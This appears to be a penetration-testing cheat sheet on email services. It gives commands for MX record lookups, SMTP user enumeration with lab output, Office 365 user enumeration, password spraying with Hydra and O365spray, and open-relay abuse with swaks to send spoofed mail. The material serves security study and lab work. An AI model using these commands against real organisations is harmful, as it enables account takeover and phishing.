---
edit:
---

# Email Services

## Records

- Online tool - [MXToolbox](https://mxtoolbox.com/)

```bash
# MX
host -t MX example.com
dig mx plaintext.do | grep "MX" | grep -v ";"

# A
host -t A mail1.example.com
```

## User enumeration

### [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)

```bash
# Install
perl -MCPAN -e shell
cpan> install Getopt::Std
wget https://github.com/pentestmonkey/smtp-user-enum/blob/master/smtp-user-enum.pl

# Run
❯ ./smtp-user-enum.pl -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12                                             ⏎
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Sep 25 21:26:18 2025 #########
10.129.203.12: marlin@inlanefreight.htb exists
```

### [O365spray](https://github.com/0xZDH/o365spray)

```bash
# Validate target
python3 o365spray.py --validate --domain msplaintext.xyz

# Identify users
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

## Password Attacks

```bash
# Hydra
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

# O365 Spray
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Protocol Specifics

### Open Relay

```bash
# Identify
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

# Relay
swaks --from notifications@example.com --to employees@example.com --header 'Subject: Company Notification' --body ' ---MESSAGE--- ' --server 10.10.11.213
```

## Vulns

- [CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247) - OpenSMTPD < 6.6.2
-  